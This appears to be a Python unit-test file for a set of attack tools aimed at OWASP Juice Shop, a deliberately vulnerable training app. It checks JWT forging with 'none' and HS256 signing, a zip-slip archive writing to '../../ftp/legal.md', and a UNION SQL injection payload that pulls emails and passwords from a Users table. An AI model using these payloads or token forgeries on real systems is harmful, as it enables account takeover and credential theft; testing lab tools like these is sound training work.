import hashlib
import hmac
import os
import subprocess
import sys
import unittest
import zipfile

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
TOOLS_DIR = os.path.join(REPO_ROOT, "tools")
sys.path.insert(0, TOOLS_DIR)

import jwt_forge
from union_sqli import build_payload


class TestJuiceShopTools(unittest.TestCase):
    def test_security_answer_hmac(self):
        cmd = [sys.executable, os.path.join(TOOLS_DIR, "security_answer_hmac.py"), "Samuel"]
        res = subprocess.run(cmd, capture_output=True, text=True, check=True)
        expected = "d2425fd880e7f38c5b091a2aa32c89e7de94f0aee517ba8a6025e1287acefade"
        self.assertEqual(res.stdout.strip(), expected)

    def test_jwt_forge_none(self):
        cmd = [
            sys.executable,
            os.path.join(TOOLS_DIR, "jwt_forge.py"),
            "none",
            "--email",
            "admin@juice-sh.op",
        ]
        res = subprocess.run(cmd, capture_output=True, text=True, check=True)
        token = res.stdout.strip()
        parts = token.split(".")
        self.assertEqual(len(parts), 3)
        self.assertEqual(parts[2], "")  # alg:none signature is empty

    def test_jwt_forge_hs256(self):
        secret = "secret123"
        email = "attacker@juice-sh.op"
        token = jwt_forge.sign({"alg": "HS256", "typ": "JWT"}, {"email": email}, secret.encode())
        parts = token.split(".")
        self.assertEqual(len(parts), 3)
        # Verify hmac
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        expected_sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        self.assertEqual(parts[2], jwt_forge.b64url(expected_sig))

    def test_make_zip_slip(self):
        test_zip = os.path.join(REPO_ROOT, "tests", "test_slip.zip")
        try:
            cmd = [
                sys.executable,
                os.path.join(TOOLS_DIR, "make_zip_slip.py"),
                test_zip,
                "../../ftp/legal.md",
                "malicious_payload",
            ]
            subprocess.run(cmd, capture_output=True, text=True, check=True)
            self.assertTrue(os.path.exists(test_zip))
            with zipfile.ZipFile(test_zip, "r") as z:
                names = z.namelist()
                self.assertIn("../../ftp/legal.md", names)
                self.assertEqual(z.read("../../ftp/legal.md").decode(), "malicious_payload")
        finally:
            if os.path.exists(test_zip):
                os.remove(test_zip)

    def test_union_sqli_payload_builder(self):
        payload = build_payload("id,email,password", "Users", "id=1")
        # Should pad 3 columns to 9 total columns and inject UNION
        self.assertIn("SELECT id, email, password, 4, 5, 6, 7, 8, 9 FROM Users WHERE id=1", payload)
        self.assertTrue(payload.startswith("x')) UNION "))
        self.assertTrue(payload.endswith("--"))

    def test_node_coding_challenge_solver_dry_run(self):
        cmd = ["node", os.path.join(TOOLS_DIR, "coding_challenge_solver.mjs"), "--dry-run"]
        res = subprocess.run(cmd, capture_output=True, text=True, check=True)
        self.assertIn("[dry-run] no requests sent", res.stdout)


if __name__ == "__main__":
    unittest.main()
